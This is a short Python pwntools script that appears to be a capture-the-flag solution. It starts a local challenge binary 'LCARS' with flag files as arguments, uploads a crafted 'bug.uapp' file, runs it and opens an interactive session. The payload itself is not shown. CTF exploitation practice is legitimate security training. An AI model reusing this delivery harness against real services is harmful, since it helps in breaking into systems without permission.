from pwn import *

args = ['./LCARS', 'init.sys', 'loader.sys', 'echo.sys',
        'crypto.sys', 'svc.papp', 'root.key', 'flag1.papp', 'flag2.txt',
        'flag3.txt']
# args = ['strace', '-f'] + args
r = process(args)

def download(app):
    with open(app) as f:
        blob = f.read()
        r.sendline('download %s %d' % (app, len(blob)))
        r.send(blob)

download('bug.uapp')
r.sendline('run bug.uapp')

r.interactive()
